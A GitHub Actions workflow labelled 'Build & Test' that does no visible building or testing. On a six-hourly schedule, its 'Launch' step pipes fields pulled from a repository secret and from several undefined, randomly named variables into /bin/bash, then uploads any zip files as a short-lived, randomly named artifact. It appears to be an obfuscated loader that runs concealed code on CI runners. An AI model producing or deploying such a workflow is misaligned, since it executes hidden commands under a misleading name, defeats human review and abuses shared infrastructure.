name: Build & Test
on:
  workflow_dispatch:

  schedule:
    - cron: '29 1,7,13,19 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  ci:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Launch
        env:
          rd6: ${{ secrets.rd6 }}
        run: |
          printf '%s' "$rd6" | jq -r .bnoaa2207 | /bin/bash
          printf '%s' "$p2169" | jq -r .ow411 | /bin/bash
          printf '%s' "$jperq7597" | jq -r .frknc68706 | /bin/bash
          printf '%s' "$seqb8" | jq -r .wf756 | /bin/bash
          echo $bhn0 | jq -r .sxywn6862 | /bin/bash

      - name: Save artifact
        uses: actions/upload-artifact@v4
        with:
          name: Yvs5NVBa
          path: "*.zip"
          retention-days: 1
